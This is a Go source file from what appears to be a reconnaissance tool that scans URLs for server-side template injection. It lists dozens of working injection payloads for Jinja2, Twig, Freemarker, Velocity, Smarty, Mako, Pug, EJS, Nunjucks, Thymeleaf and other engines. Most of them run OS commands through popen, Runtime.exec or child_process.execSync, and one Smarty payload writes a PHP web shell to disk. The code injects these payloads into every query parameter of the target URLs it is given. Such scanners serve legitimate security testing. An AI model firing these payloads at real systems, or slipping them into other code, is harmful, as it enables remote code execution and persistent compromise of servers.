package ssti

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"sync"

	"github.com/a0x194/recon-hunter/internal/config"
	"github.com/a0x194/recon-hunter/internal/types"
	"github.com/a0x194/recon-hunter/internal/utils"
)

// SSTI payloads for different template engines
var sstiPayloads = []struct {
	payload   string
	expected  string
	engine    string
	regex     bool
}{
	// Math-based detection (polyglot)
	{"{{7*7}}", "49", "Jinja2/Twig/Nunjucks", false},
	{"${7*7}", "49", "Freemarker/Velocity/Mako", false},
	{"<%= 7*7 %>", "49", "ERB/EJS", false},
	{"#{7*7}", "49", "Ruby/Slim/Pug", false},
	{"${{7*7}}", "49", "Thymeleaf", false},
	{"{{= 7*7}}", "49", "doT.js", false},
	{"[[${7*7}]]", "49", "Thymeleaf", false},
	{"{7*7}", "49", "Smarty", false},
	{"<%=7*7%>", "49", "ERB compact", false},
	{"{{7*'7'}}", "7777777", "Jinja2", false},
	{"{{config}}", "Config", "Jinja2", false},

	// String-based detection
	{"{{\"foobar\"}}", "foobar", "Twig/Jinja2", false},
	{"${'foobar'}", "foobar", "Freemarker", false},
	{"<%= 'foobar' %>", "foobar", "ERB", false},
	{"#{\"foobar\"}", "foobar", "Ruby", false},

	// Engine-specific payloads
	// Jinja2 (Python)
	{"{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}", "uid=", "Jinja2 RCE", false},
	{"{{''.__class__.__mro__[1].__subclasses__()}}", "class", "Jinja2 sandbox bypass", false},
	{"{{config.items()}}", "SECRET", "Jinja2 config", false},
	{"{{self._TemplateReference__context}}", "context", "Jinja2 context", false},

	// Twig (PHP)
	{"{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}", "uid=", "Twig RCE", false},
	{"{{['id']|filter('system')}}", "uid=", "Twig filter RCE", false},
	{"{{app.request.server.all|join(',')}}", "SERVER_", "Twig server vars", false},

	// Freemarker (Java)
	{"<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}", "uid=", "Freemarker RCE", false},
	{"${\"freemarker.template.utility.Execute\"?new()(\"id\")}", "uid=", "Freemarker RCE v2", false},
	{"[#assign ex = 'freemarker.template.utility.Execute'?new()]${ex('id')}", "uid=", "Freemarker RCE v3", false},

	// Velocity (Java)
	{"#set($x='')##$x.getClass().forName('java.lang.Runtime').getRuntime().exec('id')", "Process", "Velocity RCE", false},
	{"$class.inspect(\"java.lang.Runtime\").type.getRuntime().exec(\"id\")", "Process", "Velocity v2", false},

	// Smarty (PHP)
	{"{php}echo `id`;{/php}", "uid=", "Smarty PHP tag", false},
	{"{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['c']); ?>\",self::clearConfig())}", "error", "Smarty RCE", false},

	// Mako (Python)
	{"<%import os%>${os.popen('id').read()}", "uid=", "Mako RCE", false},
	{"${self.module.cache.util.os.popen('id').read()}", "uid=", "Mako util RCE", false},

	// Pebble (Java)
	{"{% set cmd = 'id' %}{{ [cmd]|map('Runtime.getRuntime().exec') }}", "Process", "Pebble RCE", false},

	// Jade/Pug (Node.js)
	{"#{root.process.mainModule.require('child_process').execSync('id')}", "uid=", "Pug RCE", false},
	{"-var x = root.process.mainModule.require('child_process').execSync('id')", "uid=", "Pug v2", false},

	// doT.js (Node.js)
	{"{{= global.process.mainModule.require('child_process').execSync('id') }}", "uid=", "doT.js RCE", false},

	// EJS (Node.js)
	{"<%= global.process.mainModule.require('child_process').execSync('id') %>", "uid=", "EJS RCE", false},

	// Nunjucks (Node.js)
	{"{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('id')\")()}}", "uid=", "Nunjucks RCE", false},

	// Thymeleaf (Java Spring)
	{"__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x", "Process", "Thymeleaf RCE", false},
	{"${T(java.lang.Runtime).getRuntime().exec('id')}", "Process", "Thymeleaf v2", false},

	// Tornado (Python)
	{"{% import os %}{{ os.popen('id').read() }}", "uid=", "Tornado RCE", false},

	// Marko (Node.js)
	{"${require('child_process').execSync('id')}", "uid=", "Marko RCE", false},

	// Generic detection patterns with unique strings
	{"{{9999*9999}}", "99980001", "Generic math", false},
	{"${9999*9999}", "99980001", "Generic math v2", false},
	{"<%= 9999*9999 %>", "99980001", "Generic math v3", false},
	{"#{9999*9999}", "99980001", "Generic math v4", false},

	// Error-based detection
	{"{{foobar}}", "undefined|error|exception", "Error-based", true},
	{"${foobar}", "undefined|error|exception", "Error-based v2", true},
	{"<%= foobar %>", "undefined|error|exception", "Error-based v3", true},
}

// SSTI-prone parameter names
var sstiParams = []string{
	"template", "page", "name", "content", "view", "id", "message", "msg",
	"text", "title", "desc", "description", "body", "html", "data", "input",
	"search", "q", "query", "username", "user", "email", "comment", "preview",
	"render", "layout", "partial", "include", "file", "document", "path",
}

// Scan performs SSTI scanning
func Scan(urls []string, cfg *config.Config) ([]types.VulnResult, error) {
	var results []types.VulnResult
	var mu sync.Mutex
	var wg sync.WaitGroup

	client := utils.HTTPClient(cfg.Timeout, cfg.Proxy, true)
	sem := make(chan struct{}, cfg.Threads)

	for _, urlStr := range urls {
		if !utils.HasParam(urlStr) {
			continue
		}

		parsedURL, err := url.Parse(urlStr)
		if err != nil {
			continue
		}

		params := parsedURL.Query()
		hasSSTIParam := false
		for param := range params {
			paramLower := strings.ToLower(param)
			for _, sstiParam := range sstiParams {
				if strings.Contains(paramLower, sstiParam) {
					hasSSTIParam = true
					break
				}
			}
		}

		// Also test if no specific param found but URL has params
		if !hasSSTIParam && len(params) > 0 {
			hasSSTIParam = true
		}

		if !hasSSTIParam {
			continue
		}

		wg.Add(1)
		sem <- struct{}{}

		go func(u string) {
			defer wg.Done()
			defer func() { <-sem }()

			vulns := testSSTI(u, client)
			if len(vulns) > 0 {
				mu.Lock()
				results = append(results, vulns...)
				mu.Unlock()
			}
		}(urlStr)
	}

	wg.Wait()
	return results, nil
}

func testSSTI(urlStr string, client *http.Client) []types.VulnResult {
	var results []types.VulnResult

	parsedURL, err := url.Parse(urlStr)
	if err != nil {
		return nil
	}

	params := parsedURL.Query()

	for param := range params {
		for _, test := range sstiPayloads {
			result := testPayload(urlStr, param, test.payload, test.expected, test.engine, test.regex, client)
			if result != nil {
				results = append(results, *result)
				break // Found SSTI for this param
			}
		}
	}

	return results
}

func testPayload(urlStr, param, payload, expected, engine string, useRegex bool, client *http.Client) *types.VulnResult {
	parsedURL, _ := url.Parse(urlStr)
	originalParams := parsedURL.Query()

	testParams := url.Values{}
	for k, v := range originalParams {
		testParams[k] = v
	}
	testParams.Set(param, payload)

	parsedURL.RawQuery = testParams.Encode()
	testURL := parsedURL.String()

	resp, err := client.Get(testURL)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil
	}

	bodyStr := string(body)
	found := false

	if useRegex {
		re, err := regexp.Compile("(?i)" + expected)
		if err == nil {
			found = re.MatchString(bodyStr)
		}
	} else {
		found = strings.Contains(bodyStr, expected)
	}

	if found {
		severity := "high"
		if strings.Contains(strings.ToLower(engine), "rce") {
			severity = "critical"
		} else if strings.Contains(strings.ToLower(engine), "error") {
			severity = "medium"
		}

		return &types.VulnResult{
			Type:        "Server-Side Template Injection (SSTI)",
			Severity:    severity,
			URL:         urlStr,
			Parameter:   param,
			Payload:     payload,
			Evidence:    fmt.Sprintf("Expected '%s' found in response. Template engine: %s", expected, engine),
			Description: fmt.Sprintf("SSTI vulnerability detected. Possible template engine: %s", engine),
			Remediation: "Never pass user input directly to template engines. Use sandboxed template environments. Implement strict input validation.",
			References: []string{
				"https://portswigger.net/web-security/server-side-template-injection",
				"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection",
			},
		}
	}

	return nil
}
